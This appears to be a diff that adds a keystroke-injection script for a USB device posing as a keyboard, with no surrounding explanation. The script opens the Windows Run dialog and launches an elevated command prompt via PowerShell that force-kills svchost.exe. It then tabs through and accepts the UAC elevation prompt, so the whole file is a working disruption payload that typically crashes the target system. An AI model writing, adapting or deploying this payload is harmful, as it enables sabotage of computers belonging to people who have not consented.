@@ -1,0 +1,11 @@
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell Start-Process -FilePath cmd -Verb runAs -ArgumentList '/k taskkill /im svchost.exe /f'
+ENTER
+DELAY 1500
+TAB
+DELAY 1500
+TAB
+DELAY 500
+ENTER
